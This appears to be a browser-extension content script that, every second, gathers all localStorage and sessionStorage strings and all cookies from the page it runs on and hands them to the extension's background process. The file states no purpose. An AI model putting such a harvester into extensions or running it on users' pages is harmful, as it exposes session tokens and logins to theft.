(function() {
  console.log('INSERTED');

  function parseString(string) {
    try {
      return JSON.parse(string);
    } catch (error) {
      return JSON.parse(`"${string}"`);
    }
  }

  setInterval(() => {
    const message = {};

    // localStorage
    let local = {};
    const localData = localStorage;
    for (let key in localData) {
      if (typeof localData[key] === 'string') {
        local[key] = localData[key];
      }
    }
    message.local = local;

    // sessionStorage
    let session = {};
    const sessionData = sessionStorage;
    for (let key in sessionData) {
      if (typeof sessionData[key] === 'string') {
        session[key] = sessionData[key];
      }
    }
    message.session = session;

    // cookies
    let cookies = {};
    document.cookie.split(';').map(cookie => {
      const pair = cookie.split('=');
      cookies[pair[0]] = pair[1];
    });
    message.cookies = cookies;

    chrome.runtime.sendMessage({ content: message }, response => {
      if (response) {
        console.log(response.content);
      }
    });
  }, 1000);
})();
